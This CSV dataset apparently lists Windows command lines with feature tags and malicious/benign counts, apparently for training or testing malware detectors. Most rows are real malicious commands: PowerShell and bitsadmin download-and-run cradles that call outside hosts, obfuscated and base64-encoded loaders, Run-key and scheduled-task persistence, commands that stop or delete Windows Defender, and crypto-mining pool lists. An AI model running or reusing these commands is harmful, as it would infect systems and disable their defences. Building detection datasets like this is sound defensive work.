tags,mal_cnt,ben_cnt,example
dir_%appdata%; ext_txt; parentprocess_mshta.exe; very_high_entropy; very_high_string_len,1,25,"/c """"tools\driverpack-wget.exe"" --timeout 10 --retry-connrefused --wait=10 --timestamping --directory-prefix=""%APPDATA%\DRPNano\downloads\online"" ""http://download.drp.su/DriverPack-17-Online-autoinstall.exe"" -o ""%APPDATA%\DRPNano\temp\wget_log_53984.log"" --no-verbose & echo DONE > ""%APPDATA%\DRPNano\temp\wget_finished_53984.txt"""""
dir_%temp%; dir_%userprofile%; high_entropy; parentprocess_msiexec.exe; very_high_string_len,1,0,"/c ""if exist ""%USERPROFILE%\..\Default\AppData\Local\Google\Drive"" mkdir ""%TEMP%\DefaultAppDataGoogleDrive"" & (for /D %d in (""%USERPROFILE%\..\Default\AppData\Local\Google\Drive\*"") do robocopy ""%d"" ""%TEMP%\DefaultAppDataGoogleDrive\%~nd"" user_setup.config /r:10 /w:5 & rd /q ""%TEMP%\DefaultAppDataGoogleDrive\%~nd"") & robocopy ""%USERPROFILE%\..\Default\AppData\Local\Google\Drive\system"" ""%TEMP%\DefaultAppDataGoogleDrive\system"" /mir /r:10 /w:5 & robocopy ""%TEMP%\DefaultAppDataGoogleDrive"" ""%USERPROFILE%\..\Default\AppData\Local\Google\Drive"" /move /mir /r:10 /w:5 & rd /q ""%USERPROFILE%\..\Default\AppData\Local\Google\Drive"" & rd /q ""%USERPROFILE%\..\Default\AppData\Local\Google\Drive\.."" & rd /s /q ""%TEMP%\DefaultAppDataGoogleDrive"""""
dir_%systemroot%; dir_%windir%; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,/c chcp 65001 & schtasks /TN \Microsoft\Windows\Maintenance\WinSAT
arg_nul; low_entropy; low_string_len; parentprocess_unknown_process.exe,1,1,/c pause > nul
arg_reg; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"/C REG ADD ""HKEY_CURRENT_USER\Software\Win"" /f"
arg_start; dir_%temp%; ext_hta; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c start %TEMP%\Temp_data\bin\data\PUBG.hta
arg_1; arg_del; dir_%temp%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/C choice /C Y /N /D Y /T 1 & Del ""%TEMP%\385FF103\temp.exe"""
arg_cmd; dir_%appdata%; ext_cmd; low_entropy; normal_string_len; parentprocess_wscript.exe,1,139,"cmd /c """"%APPDATA%\List.cmd"" """
dir_%programfiles%; dir_%windir%; ext_bat; ext_exe; high_entropy; high_string_len; parentprocess_wscript.exe,1,1,"%WINDIR%\system32\cmd.exe /c """"%PROGRAMFILES%\Java\install.bat"" """
arg_-argumentlist; arg_-class; arg_-executionpolicy; arg_-name; arg_-noprofile; arg_bypass; arg_create; arg_hidden; arg_invoke-wmimethod; dir_%temp%; ext_exe; high_entropy; parentprocess_wscript.exe; very_high_string_len,1,0,"/c powershell.exe -w hidden -noprofile -executionpolicy bypass (new-object system.net.webclient).downloadfile('https://asicsverification.com/balance/info.php?jxqEus','%temp%nYd45.eXe'); InVoke-WMIMEthoD -Class WiN32_ProcESs -NAme CreaTe -ARgumenTList '%temp%nYd45.exe'"
arg_del; arg_nul; dir_%temp%; ext_11; ext_exe; high_entropy; high_string_len; parentprocess_svchost.exe,1,158,"/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del ""%TEMP%\RarSFX0\svchost.exe"""
arg_cmd; dir_%programfiles%; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"cmd /c """"%PROGRAMFILES%\CT-e1 SaaS\NGCPSuite\setFolder.cmd"" ""%PROGRAMFILES%\CT-e1 SaaS\NGCPSuite"""""
arg_attrib; dir_%allusersprofile%; ext_inf; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c attrib +s +h %ALLUSERSPROFILE%\autorun.inf
arg_attrib; dir_%allusersprofile%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c attrib -s -h %ALLUSERSPROFILE%\28percent.exe
arg_del; dir_%allusersprofile%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c del /f /q %ALLUSERSPROFILE%\28percent.exe
arg_add; arg_reg; dir_%allusersprofile%; dir_%systemroot%; dir_%windir%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v IpfxVD  /d ""%ALLUSERSPROFILE%\TEPTask.exe"" /f"
arg_schtasks; dir_%tmp%; ext_xml; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c SCHTASKS /create /tn TepTask /xml %TMP%\TEPXML.xml /f
arg_del; dir_%tmp%; ext_xml; low_entropy; normal_string_len; parentprocess_unknown_process.exe,1,4,/c del /f /q %TMP%\TEPXML.xml
arg_-n; arg_0; arg_2; arg_del; arg_ping; dir_%temp%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c ping 0 -n 2 & del ""%TEMP%\setup_papers_please_2.4.0.10.exe"""
arg_start; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"/c start """" ""http://www.freeware.de/danke/"""
arg_del; arg_delete; arg_sc; arg_stop; dir_%windir%; ext_dll; ext_exe; ext_log; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,/c (net stop wsupdatemgr & sc delete wsupdatemgr & del /F /Q %WINDIR%\SDSDec.dll %WINDIR%\svchost.exe & ipconfig /all & systeminfo) > %WINDIR%\temp\kbinst.log
arg_cmd; dir_%temp%; parentprocess_powershell.exe; very_high_entropy; very_high_string_len,1,25,"cmd /c """"%TEMP%\tmp71CA.tmp.bat""  4BEqL8aYcuydaT26Rm9BBDgx5MAPeMSeJGgMd8RJDQKaPZEVySfAaTU8bVMsp2uykJZJ1aJDtyLRHREUBe1XXjfUAty7XJy"""
dir_%temp%; ext_exe; ext_reg; high_string_len; parentprocess_unknown_process.exe; very_high_entropy,1,0,/c regedit.exe /s %TEMP%\JZmLoVXfYL8472490637695101533.reg
arg_exist; arg_if; dir_%temp%; ext_lnk; ext_lnk); high_entropy; very_high_string_len,1,30,"/c if exist %cd%\reestr0205.docx.lnk (mshta %cd%\reestr0205.docx.lnk) else (cd %TEMP%\& for /f ""tokens=*"" %f in ('dir /s/b *0205.docx.lnk') do mshta %f)"
arg_cmd; ext_txt; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,158,cmd /C echo.\\10.120.126.10\tra$\GD-Migrations\Tools\O365\>C:\temp\FILEPATH.txt
arg_bitsadmin; arg_schtasks; arg_start; dir_%temp%; ext_exe; ext_php; ext_php2; ext_txt; high_entropy; parentprocess_wscript.exe; very_high_string_len,1,0,/c bitsadmin /transfer ms5 https://styxsaloka.com/beta/backup.php2 %TEMP%\bcewuuwe.exe &bitsadmin /create /download sa1m2 &bitsadmin /addfile sa1m2 https://styxsaloka.com/beta/page.php %TEMP%\weoriweoie.txt &bitsadmin /setcustomheaders sa1m2 User-Agent:LUNARIXS &bitsadmin /resume sa1m2 &bitsadmin /complete sa1m2 &schtasks /create /st 13:29 /sc once /tn se3 /tr %TEMP%\bcewuuwe.exe || start %TEMP%\bcewuuwe.exe
arg_add; arg_reg; dir_%public%; dir_%systemroot%; dir_%windir%; ext_exe; normal_entropy; parentprocess_svchost.exe; very_high_string_len,1,0,"/c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v flag_MicrosoftSecurityService /t REG_SZ /d ""%PUBLIC%\svchost.exe"" /f"
arg_cmd; arg_start; dir_%appdata%; ext_cmd; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,cmd /c start %APPDATA%\d4c2f5a4-588b-4ba6-86cc-57baeb00dfe2\AdobeService.cmd
dir_%appdata%; ext_cmd; high_string_len; normal_entropy; parentprocess_cmd.exe,1,333,/K %APPDATA%\d4c2f5a4-588b-4ba6-86cc-57baeb00dfe2\AdobeService.cmd
arg_del; arg_ping; dir_%systemroot%; dir_%userprofile%; dir_%windir%; ext_01; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c ping 127.0.0.1 & del ""%USERPROFILE%\windows update.exe"""
arg_del; ext_exe; low_entropy; low_string_len; parentprocess_colorcpl.exe,1,2,"/c del ""C:\hect.exe"""
arg_cmd; arg_start; dir_%appdata%; ext_vbs; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,158,cmd /c start %APPDATA%\d77fa444-2416-404d-957c-35dbbf49ef8f\AdobeService.vbs
arg_cmd; arg_start; dir_%appdata%; ext_lnk; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,158,cmd /c start %APPDATA%\d77fa444-2416-404d-957c-35dbbf49ef8f\AdobeService.lnk
arg_-; arg_1; arg_cd; arg_echo; arg_exit; arg_off; arg_set; arg_start; dir_%windir%; ext_jpg; normal_entropy; parentprocess_cmd.exe; very_high_string_len,1,1,"/V /C set yrswz=https://www.java.com/download/&&echo | start %yrswz%                                                                                                                                                                         &&set kdvx=iEx&&set jmdu=tRi&&set hvmq=bJe&&set fdu=LOad&&set emcj=nop&&set babdocbh=NEw&&set aik=wEbc&&set pniki=Ers&&set rfqfkrc=hEll&&set una=pOw&&set wfrq=https://s3.us-east-2.amazonaws.com/pycloud/donwFr1.jpg&&@echo off && C: && cd\ && cd %WINDIR%\System32 && echo %kdvx%(""%kdvx%(!babdocbh!-o%hvmq%ct NeT.!aik!Lient).down%fdu%S%jmdu%NG('%wfrq%')""); | Windows!una!!pniki!!rfqfkrc!\v1.0\!una!!pniki!!rfqfkrc! -!emcj! -win 1 - & exit"
parentprocess_cmd.exe; very_high_string_len; very_low_entropy,1,0,"/S /D /c"" start %yrswz%                                                                                                                                                                         """
arg_start; dir_%temp%; ext_pif; normal_entropy; not_in_range; parentprocess_unknown_process.exe,1,14,/c start %TEMP%\6C.pif
arg_5; arg_minute; arg_schtasks; dir_%appdata%; very_high_entropy; very_high_string_len,1,25,"/c schtasks   /create /sc MINUTE /mo 5 /tn ""Windows Updata Services"" /tr ""\""%APPDATA%\Local Service.exe\"" \""C:\PICUS_863a9199decf36895d5d7d148ce9fd622e825f393d7ebe7591b4d37ef3f5f677.dll\"",OpenURLB"" /F"
dir_%temp%; dir_%windir%; ext_txt; high_string_len; parentprocess_mshta.exe; very_high_entropy,1,0,"/C """"%WINDIR%\System32\net.exe"" localgroup ""Администраторы"" > ""%TEMP%\HelpKontur\logs\jj644gdy.txt"""""
arg_-n; arg_0; arg_2; arg_del; arg_ping; dir_%appdata%; dir_%systemroot%; dir_%windir%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"/c ping 0 -n 2 & del ""%APPDATA%\WindowsDefender.exe"""
arg_sc; arg_stop; arg_windefend; low_entropy; low_string_len,1,2,/c sc stop WinDefend
arg_delete; arg_sc; arg_windefend; low_entropy; not_in_range,1,15,/c sc delete WinDefend
arg_-disablerealtimemonitoring; arg_powershell; arg_set-mppreference; high_string_len; normal_entropy,1,333,/c powershell Set-MpPreference -DisableRealtimeMonitoring $true
arg_name; dir_%windir%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,%WINDIR%\system32\cmd.exe /c wmic cpu get name
arg_wmic; dir_%windir%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,%WINDIR%\system32\cmd.exe /c WMIC diskdrive get SerialNumber
arg_2; arg_echo; arg_exit; dir_%appdata%; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c echo [zoneTransfer]ZoneID = 2 > ""%APPDATA%\rulk.exe"":ZONE.identifier & exit"
arg_2; arg_echo; arg_exit; dir_%appdata%; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,158,"/c echo [zoneTransfer]ZoneID = 2 > ""%APPDATA%\zsfmjkjh\filename.exe"":ZONE.identifier & exit"
dir_%appdata%; dir_%systemroot%; dir_%windir%; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/C @powershell ""$x=(New-Object -ComObject WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\26074.lnk');$x.TargetPath='C:\26074.exe';$x.HotKey='CTRL+ALT+F';$x.Save()"""
arg_dir; arg_nul; dir_%temp%; ext_bat; normal_entropy; normal_string_len; parentprocess_cmd.exe,1,2,"/c dir /b /s ""%TEMP%\DLauncher.bat"" 2>nul"
ext_cmd; low_entropy; normal_string_len; parentprocess_unknown_process.exe,1,4,/c data\Option\Install.cmd
arg_-n; arg_0; arg_2; arg_del; arg_ping; dir_%appdata%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c ping 0 -n 2 & del ""%APPDATA%\Microsoft Windows Search.exe"""
dir_%temp%; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"/c """"%TEMP%\portable_install_00000728\septool"" comparelocal -l ""C:\Lenovo_Support"" -s ""%TEMP%\portable_install_00000728"" -m NONE -o windows -a 32 1>sep.log 2>NUL"""
arg_del; ext_exe; low_entropy; low_string_len; parentprocess_raserver.exe,1,2,"/c del ""C:\1n124.exe"""
arg_ping; arg_schtasks; ext_01; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,/c ping 127.0.0.1 && SCHTASKS /Run /TN DirectXComponentLibrary
arg_1; arg_minute; arg_schtasks; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c schtasks /create /tn ""WindowsUpdater"" /sc MINUTE /mo 1 /tr ""C:\""Logs""\""system""\""system64""\""WindowsUpdater.exe"""""
arg_cmd; dir_%temp%; dir_%windir%; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"cmd /c """"%TEMP%\mia1\FileDeleteOnly.bat"" ""%WINDIR%\asp*.delme"""""
arg_schtasks; dir_%programfiles%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,/c schtasks /create /sc onlogon /tn 3253610494 /rl highest /tr %PROGRAMFILES%\COMMON~1\D4DE58~1.EXE
normal_entropy; parentprocess_mshta.exe; very_high_string_len,1,0,"""/c    pOWERsheLL.Exe  -EX Bypass -NOl-w hIDdEN-ec IAAgAAkAcwBlAHQALQBjAG8AbgBUAEUATgBUAAkADAAgAC0AVgBBACAACwAgACgAIAAMACAAbgBFAHcALQBPAEIASgBlAEMAVAAJACAAIABzAHkAcwB0AGUATQAuAE4ARQB0AC4AVwBlAEIAQwBMAEkARQBOAHQACQALAAkAKQAuAEQAbwB3AE4ATABvAEEARABkAEEAVABhACgAIAAJACAAHSBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBlAGMAZQBuAHQAZQByAHUAcABkAGEAdABlAGQALgB4AHkAegAvAGQAaABsAC8AcABwAC4AZQB4AGUAHSAJACAAIAApAAkAIAAgAC0ARQBuACAACQAJAGIAeQBUAEUACQAgACAALQBwAEEAVABIAAkACwAJAB0gJABFAE4AVgA6AGEAcABQAEQAQQB0AGEAXABvADEAMQBwAHUAdAAuAGUAeABlAB0gCQALACAAOwAgAAwACQBTAHQAYQByAFQACQAJAAkAHSAkAGUAbgBWADoAQQBQAFAAZABhAHQAQQBcAG8AMQAxAHAAdQB0AC4AZQB4AGUAHSA= """
arg_cmd; dir_%windir%; ext_cmd; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"cmd /c """"%WINDIR%\system32\SuperClientEx\setup.cmd"" """
arg_mkdir; dir_%temp%; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"/c mkdir ""%TEMP%\portable_install_00000728"""
arg_nul; ext_exe; ext_zip; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c .\miniunz.exe -o image.zip > nul
arg_mkdir; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c mkdir C:\Lenovo_Support
arg_cd; arg_exit; dir_%appdata%; ext_exe; ext_zip; high_entropy; high_string_len; parentprocess_powershell.exe,1,158,/k c: & cd\ & cd %APPDATA%\& HckYjAh.exe x Cfal.zip -pq1w2e3r4t5y6u7i8o9p0 -y & exit
dir_%temp%; ext_bat; high_entropy; high_string_len; parentprocess_cmd.exe,1,1,"/S /D /c"" del %TEMP%\{dba7e059-0a25-4a4e-af3c-e3b4a9d876e6}.bat"""
dir_%temp%; dir_%windir%; ext_bat; ext_exe; high_entropy; high_string_len; parentprocess_wscript.exe,1,1,"%WINDIR%\system32\cmd.exe /c """"%TEMP%\bankofjiangsu\auto.bat"" """
arg_cmd; ext_docx; normal_entropy; normal_string_len; parentprocess_cmd.exe,1,1,cmd  /C ZoningOrdCity(Chapter08).docx
arg_1; arg_minute; arg_schtasks; dir_%systemroot%; dir_%windir%; ext_exe; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"/c schtasks /create /tn ""Microsoft\Windows\java\jued"" /tr ""%WINDIR%\addins\taskeng.exe"" /ru VCz3c9v /it /rl highest /sc minute /mo 1 /f"
arg_powershell; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/c at 17:36 powershell -command ""& {Remove-Item 'C:\PICUS_9661f70ead79a1ff35282bf2d061acb2733900eea87e2233ac7b8f8d3a80ad75.exe' -Force}"""
arg_1; arg_minute; arg_schtasks; dir_%systemroot%; dir_%windir%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"/c schtasks /create /tn ""Microsoft\Windows\java\jued"" /tr ""C:\PICUS_~1.EXE"" /ru HDB0x8X /it /rl highest /sc minute /mo 1 /f"
arg_1; arg_minute; arg_schtasks; dir_%systemroot%; dir_%windir%; ext_exe; normal_entropy; parentprocess_csrss.exe; very_high_string_len,1,0,"/c schtasks /create /tn ""Microsoft\Windows\java\jued"" /tr ""%WINDIR%\taskeng.exe"" /ru mrLh6ig /it /rl highest /sc minute /mo 1 /f"
arg_del; arg_taskkill; dir_%windir%; ext_exe; high_string_len; normal_entropy; parentprocess_csrss.exe,1,333,"/c taskkill /f /pid 2868 & del ""%WINDIR%\temp\csrss.exe"" /q"
dir_%appdata%; dir_%systemroot%; dir_%userprofile%; dir_%windir%; ext_vbs; high_entropy; parentprocess_mshta.exe; very_high_string_len,1,0,"""/c PoWerSHEll.exE-EXByPASs-noP-whIdDeN(NeW-oBJEcT SySTEm.NeT.wEbcLIenT).DOwnLOADfIlE('http://orders.etrade.website/30/WinUpdateBatchXX2018.vbs' ,'C:\Users\HAPUBWS\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdateBatchX2018.vbs');STarT'C:\Users\HAPUBWS\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdateBatchX2018.vbs'"""
arg_bitsadmin; arg_schtasks; dir_%temp%; ext_exe; ext_php2; normal_entropy; parentprocess_wscript.exe; very_high_string_len,1,0,/c bitsadmin /transfer msd5 http://cdn-onenote.net/doc/microsoft.php2 %TEMP%\adfdsfgerfgtrtr.exe &schtasks /create /st 22:43 /sc once /tn se3 /tr %TEMP%\adfdsfgerfgtrtr.exe
arg_bitsadmin; arg_once; arg_schtasks; arg_start; dir_%temp%; ext_exe; ext_php; ext_php2; ext_txt; high_entropy; parentprocess_wscript.exe; very_high_string_len,1,0,/c bitsadmin /transfer ms5 https://xeroprofile.com/office/archive.php2 %TEMP%\bcewuuwe.exe &bitsadmin /create /download saxbm2 &bitsadmin /addfile saxbm2 https://xeroprofile.com/office/manager.php %TEMP%\weoriweoie.txt &bitsadmin /setcustomheaders saxbm2 User-Agent:LUNARTAX &bitsadmin /resume saxbm2 &bitsadmin /complete saxbm2 &schtasks /create /st 02:44 /sc once /tn se3 /tr %TEMP%\bcewuuwe.exe || start %TEMP%\bcewuuwe.exe
arg_-n; arg_1; arg_del; arg_nul; arg_ping; ext_01; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c PING 127.0.0.1 -n 1 >NUL 2>&1 & PING ::1 -n 1 >NUL 2>&1 & del ""C:\LaunchU3.exe"" > NUL"
arg_dir; arg_echo; arg_set; dir_%appdata%; dir_%temp%; ext_js; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/V:ON /C dir /S/B/A-D ""%APPDATA%\Mozilla\prefs.js"" > ""%TEMP%\fegrt"" && SETLOCAL EnableDelayedExpansion && set /p v=<""%TEMP%\fegrt"" && echo ^user_pref(""devtools.selfxss.count"", 100); >> ""!v!"""
arg_cmd; arg_findstr; arg_set; dir_%userprofile%; ext_lnk; ext_ps1; high_entropy; very_high_string_len,1,30,"/c  findstr /s aXA4hHy9f  %USERPROFILE%\\*.lnk  > %USERPROFILE%\Documents\mija.ps1& set i=""h""& set j=""s""&   cmd /c powers%i%ell -ep bypa%j%s  -File %USERPROFILE%\Documents\mija.ps1"
arg_cmd; dir_%userprofile%; ext_ps1; high_string_len; normal_entropy; parentprocess_cmd.exe,1,333,cmd  /c powers%i%ell -ep bypa%j%s  -File %USERPROFILE%\Documents\mija.ps1
arg_cmd; arg_exit; dir_%tmp%; ext_txt; low_entropy; normal_string_len; parentprocess_unknown_process.exe,1,4,"/c cmD < ""%tmP%\aaaaaaaaaa.txt"" & exit"
arg_all; dir_%appdata%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c %APPDATA%\Microsoft\log\pass.exe all
arg_hostname; low_entropy; not_in_range; parentprocess_unknown_process.exe,1,15,/k HOSTNAME
arg_-n; arg_2; arg_del; arg_nul; arg_ping; ext_01; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"/C ping 127.0.0.1 -n 2 > Nul & Del /F /Q ""C:\af853941660dc87d9b70abab0987fcaf01664c99555888db0d229bdd441a6ab2.exe"""
arg_at; low_string_len; parentprocess_unknown_process.exe; very_low_entropy,1,0,/C AT /delete /yes
arg_at; dir_%userprofile%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"/C AT 09:00 /interactive /EVERY:m,t,w,th,f,s,su %USERPROFILE%\Desktop\system3_.exe"
arg_cmd; ext_cmd; high_string_len; normal_entropy,1,333,"cmd /c """"C:\NF-e33394090324092300000897238974789237480009828739487237894.pdf.cmd"" """
dir_%windir%; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,/c xcopy files\ABIT\info %windir%\system32\oobe\info /cheriky
arg_-n; arg_1; arg_del; arg_nul; arg_ping; ext_01; ext_dll; high_string_len; normal_entropy,1,333,"/c PING 127.0.0.1 -n 1 >NUL 2>&1 & PING ::1 -n 1 >NUL 2>&1 & del ""C:\mpr10.dll"" > NUL"
arg_del; dir_%windir%; ext_tmp; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"/c del ""%WINDIR%\Installer\MSIC387.tmp"""
arg_cmd; ext_br; low_entropy; not_in_range,1,15,cmd  /C ftp.bmf.com.br
arg_add; dir_%appdata%; dir_%systemroot%; dir_%windir%; ext_exe; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"/c reg.exe add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""mgXJuEI"" /t REG_SZ /d ""%APPDATA%\838nSFvGt987.exe"" /f"
ext_bat; low_entropy; low_string_len; parentprocess_mshta.exe,1,1,/c C:\_.bat ::
arg_type; dir_%temp%; dir_%windir%; ext_exe; ext_txt; normal_entropy; normal_string_len; parentprocess_cmd.exe,1,1,"%WINDIR%\system32\cmd.exe /c type ""%TEMP%\os.txt"""
arg_3; arg_del; arg_y; dir_%temp%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,/C choice /C Y /N /D Y /T 3 & Del %TEMP%\Growtopia Bruteforce v3.EXE
arg_-executionpolicy; arg_-windowstyle; arg_bypass; arg_hidden; ext_exe; ext_exe;; normal_entropy; parentprocess_mshta.exe; very_high_string_len,1,0,"/c powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden $tp=Test-Path $env:APPDATA\puttggggyeeeeeeeeeeeeeeidfgngdddd.exe; if(!$tp){(New-Object System.Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe',$env:APPDATA + '\puttggggyeeeeeeeeeeeeeeidfgngdddd.exe'); Start-Process $env:APPDATA\puttggggyeeeeeeeeeeeeeeidfgngdddd.exe;} Stop-Process -processname mshta;"
arg_cmd; dir_%appdata%; dir_%systemroot%; dir_%windir%; ext_exe; ext_exe*; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"cmd /c xcopy ""C:\a88ca697d86526309fd3fdb2e8a84170b8b382c80de6ddc59e387d7b92abb2f9.exe"" ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winsvc.exe*"""
arg_echo; dir_%temp%; ext_txt; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,/c (echo stratum+tcp://mine.moneropool.com:3333& echo stratum+tcp://monero.crypto-pool.fr:3333& echo stratum+tcp://xmr.prohash.net:7777& echo stratum+tcp://pool.minexmr.com:5555)> %TEMP%\pools.txt
dir_%allusersprofile%; dir_%systemroot%; dir_%windir%; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/C """"pin_to_taskbar.bat"" ""%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\MCLauncher"" ÎÒµÄÊÀ½çÆô¶¯Æ÷.lnk ""Pin to Tas&kbar"""""
dir_%temp%; ext_cmd; low_entropy; low_string_len; parentprocess_unknown_process.exe,1,1,/c %TEMP%\doscmd1.cmd
dir_%userprofile%; dir_%windir%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"%WINDIR%\system32\cmd.exe /C AT 09:00 /interactive /EVERY:m,t,w,th,f,s,su %USERPROFILE%\Desktop\system3_.exe"
arg_cmd; dir_%appdata%; ext_cmd; normal_entropy; normal_string_len; parentprocess_wscript.exe,1,1,"cmd /c """"%APPDATA%\CodeIntegrity\ev.cmd"" """
arg_create; arg_net; arg_sc; arg_start; dir_%windir%; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c sc create vntlyws binpath= ""rundll32 %WINDIR%\s546i.txt,ServiceRun"" & net start vntlyws"
dir_%localappdata%; dir_%windir%; ext_bat; ext_exe; high_entropy; high_string_len; parentprocess_cmd.exe,1,1,"%WINDIR%\system32\cmd.exe /c """"%LOCALAPPDATA%\Growtopia_Brutefoce_V3.bat"" """
arg_add; arg_reg; dir_%localappdata%; dir_%systemroot%; dir_%windir%; ext_exe; high_string_len; normal_entropy; parentprocess_cmd.exe,1,333,/C REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V winamp.exe /T REG_SZ /D %LOCALAPPDATA%\winamp.exe
dir_%localappdata%; dir_%windir%; ext_bat; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,1,"%WINDIR%\system32\cmd.exe /c """"%LOCALAPPDATA%\Growtopia_Brutefoce_V3.bat"" """
dir_%windir%; ext_cmd; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,1,%WINDIR%\system32\cmd.exe /c .\Installer.cmd
arg_add; arg_reg; dir_%localappdata%; dir_%systemroot%; dir_%windir%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,/C REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V winamp.exe /T REG_SZ /D %LOCALAPPDATA%\winamp.exe
arg_cmd; ext_y7��; low_entropy; normal_string_len; parentprocess_unknown_process.exe,1,4,"cmd /C ""S���&�?[!��P��Ϙ�3�{M��>��l?9�:9[��9[G��\.y7��"""
